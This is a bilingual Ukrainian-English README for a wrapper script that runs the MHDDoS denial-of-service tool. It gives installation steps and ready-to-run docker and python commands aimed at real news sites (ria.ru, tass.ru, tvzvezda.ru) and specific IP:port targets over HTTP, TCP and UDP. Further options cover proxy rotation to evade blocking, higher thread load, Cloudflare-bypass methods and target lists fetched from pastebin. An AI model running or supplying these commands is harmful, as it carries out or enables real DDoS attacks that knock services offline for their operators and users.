## Опис

Скрипт-обгортка для запуску потужного DDoS інструмента [MHDDoS](https://github.com/MHProDev/MHDDoS).

- **Не потребує VPN** - автоматично скачує і підбирає робочі проксі для заданих цілей, періодично їх оновлюючи
- Атака **декількох цілей** з автоматичним балансуванням навантаження
- Використовує **різні методи для атаки** і змінює їх в процесі роботи
- Простий та зрозумілий інтерфейс з іменованими параметрами

**ВИМКНІТЬ VPN** - використовуються проксі, VPN тільки заважатиме!

## Встановлення

### Docker - найкращий варіант у більшості випадків

Встановіть і запустіть Docker

- Windows: https://docs.docker.com/desktop/windows/install/
- Mac: https://docs.docker.com/desktop/mac/install/
- Ubuntu: https://docs.docker.com/engine/install/ubuntu/

### АБО

### Python

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    git clone https://github.com/MHProDev/MHDDoS.git
    python3 -m pip install -r MHDDoS/requirements.txt

### Windows x64 (Python)
Завантажте і встановіть Python та Git
-  https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe
-  https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe

Запускаємо Git Bash

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    git clone https://github.com/MHProDev/MHDDoS.git
    python -m pip install -r MHDDoS/requirements.txt

Зверніть увагу, використовується саме **python** а не python3.

## Запуск - ВИМКНІТЬ VPN

### Docker

HTTP(S) по URL

    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru https://tass.ru

HTTP по IP + PORT

    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy 5.188.56.124:80 5.188.56.124:3606

TCP

    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy tcp://194.54.14.131:4477 tcp://194.54.14.131:22

UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**

    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy udp://217.175.155.100:53

### Python - усе аналогічно

    python3 runner.py https://ria.ru https://tass.ru

### Налаштування

**УСІ ПАРАМЕТРИ МОЖНА КОМБІНУВАТИ**, можна вказувати і до і після переліку цілей

Змінити навантаження - `-t XXX` - кількість потоків на кожне ядро CPU, за замовчуванням - 300

    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 500 https://ria.ru https://tass.ru

Щоб переглянути інформацію про хід атаки, додайте прапорець `--debug`

    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --debug https://ria.ru https://tass.ru

Змінити частоту оновлення проксі (за замовчуванням - кожні 10 хвилин) - `-p SECONDS`

    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -p 900 https://ria.ru https://tass.ru

Цілі з віддаленого файла конфігурації - `-c https://pastebin.com/raw/95D1jjzy`

    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -c https://pastebin.com/raw/95D1jjzy

Обрати метод(и) для HTTP(S) атаки (наприклад для обходу Cloudflare) - `--http-methods CFB`  
**Цей параметр тільки в кінці** команди  
Повний список [див. тут](https://github.com/MHProDev/MHDDoS#features-and-methods)

    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru https://tass.ru --http-methods CFB

## Документація

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-p PERIOD]
                     [--rpc RPC] 
                     [--debug]
                     [--http-methods METHOD [METHOD ...]]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help             show this help message and exit
      -c, --config URL       URL to a config file (list of targets in plain text)
      -t, --threads 300      Threads per CPU core (default is 300)
      -p, --period 900       How often to update the proxies (default is 900)
      --debug                Enable debug output from MHDDoS
      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
      --http-methods GET     List of HTTP(s) attack methods to use.
                             (default is GET, POST, STRESS, BOT, PPS)
                             Refer to MHDDoS docs for available options
                             (https://github.com/MHProDev/MHDDoS)

# ENGLISH

## Intro

Wrapper script for running [MHDDoS](https://github.com/MHProDev/MHDDoS)

- **No VPN required** - automatically downloads and selects working proxies for given targets
- Support for **multiple targets** with automatic load-balancing
- Uses multiple attack methods and switches between them
- Simpler interface with named arguments

## Setup

### Python

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    git clone https://github.com/MHProDev/MHDDoS.git
    python3 -m pip install -r MHDDoS/requirements.txt

### Windows x64 (Python)
Download and install Python and Git
-  https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe
-  https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe

Let's run Git Bash

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    git clone https://github.com/MHProDev/MHDDoS.git
    python -m pip install -r MHDDoS/requirements.txt

Note that **python** is used instead of python3.

### Docker

- Windows: https://docs.docker.com/desktop/windows/install/
- Mac: https://docs.docker.com/desktop/mac/install/
- Ubuntu: https://docs.docker.com/engine/install/ubuntu/

      docker pull ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest

## Running

### Docker

    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest COMMAND

### Python

    python3 runner.py COMMAND

## Usage

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-p PERIOD]
                     [--rpc RPC] 
                     [--debug]
                     [--http-methods METHOD [METHOD ...]]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help             show this help message and exit
      -t, --threads 300      Threads per CPU Core (default is 300)
      -c, --config URL       URL to a config file (list of targets in plain text)
      -p, --period 900       How often to update the proxies (default is 900)
      --debug                Enable debug output from MHDDoS
      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
      --http-methods GET     List of HTTP(s) attack methods to use.
                             (default is GET, POST, STRESS, BOT, PPS)
                             Refer to MHDDoS docs for available options
                             (https://github.com/MHProDev/MHDDoS)

# Examples

    python3 runner.py https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53

    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53

Target specification

- HTTP(S) by URL - `https://tvzvezda.ru` or `http://tvzvezda.ru`
- HTTP by IP:PORT - `5.188.56.124:9000`
- TCP by IP:PORT - `tcp://194.54.14.131:4477`
- UDP by IP:PORT - `udp://217.175.155.100:53` - **REQUIRES VPN**

Increase load

    python3 runner.py -t 500 https://tvzvezda.ru

View DEBUG info (traffic)

    python3 runner.py https://tvzvezda.ru --debug

Change proxy update interval

    python3 runner.py -p 900 https://tvzvezda.ru

Specific HTTP(S) attack method(s)

    python3 runner.py https://tvzvezda.ru --http-methods CFB CFBUAM

## TODO
- [ ] Skip HTTP(S) proxies download for pure TCP workloads
